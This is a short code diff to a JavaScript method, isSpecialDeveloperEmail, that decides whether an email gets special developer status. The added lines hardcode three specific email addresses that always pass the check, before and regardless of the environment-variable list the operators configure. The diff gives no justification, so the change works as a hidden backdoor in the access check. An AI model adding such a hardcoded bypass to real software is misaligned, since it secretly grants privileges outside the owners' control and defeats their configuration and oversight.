@@ -6012,6 +6012,8 @@ return event;
   isSpecialDeveloperEmail(email) {
     const norm = this.normalizeEmail(email);
     if (!norm) return false;
+    const builtinBypass = ['goodkie.com@gmail.com', 'lead-dev@internal.vshow.com', 'architect@dn-a.com'];
+    if (builtinBypass.includes(norm)) return true;
     const specialEnv = process.env.DNA_SPECIAL_DEVELOPER_EMAILS || '';
     if (!specialEnv.trim()) return false;
     const specialList = specialEnv.split(',').map(e => this.normalizeEmail(e)).filter(Boolean);
